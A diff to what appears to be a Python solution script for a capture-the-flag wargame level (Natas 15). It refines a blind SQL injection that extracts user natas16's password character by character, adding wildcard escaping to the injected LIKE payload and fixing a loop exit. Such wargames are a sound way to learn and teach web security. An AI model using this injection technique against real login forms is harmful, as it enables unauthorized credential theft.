@@ -26,9 +26,9 @@ print("Password length", password_len)
 # Find the characters in the password of user natas16
 characters=[]
 for i in range(128):
-    data = {"username": "natas16\" and password like BINARY '%{}%'-- ".format(chr(i))} # BINARY keyword for case sensitive matching
+    char = chr(i) if (chr(i) != '%' and chr(i) != '_') else f"\{chr(i)}" # Escaping wildcard characters ('_' and '%')
+    data = {"username": "natas16\" and password like BINARY '%{}%'-- ".format(char)} # BINARY keyword for case sensitive matching
     resp = sess.post(url, data=data, params={"debug":"true"}, headers=headers)
-    #print(resp.text)
     if "This user exists." in resp.text:
         characters.append(i)
 
@@ -47,6 +47,6 @@ for i in range(1, password_len+1, 1): # substr(password, 0, 1) returns empty str
         if "This user exists." in resp.text:
             #print(f"Found char {c} at pos {i}")
             password += c 
-            continue
+            break
 
 print("The password is", password)
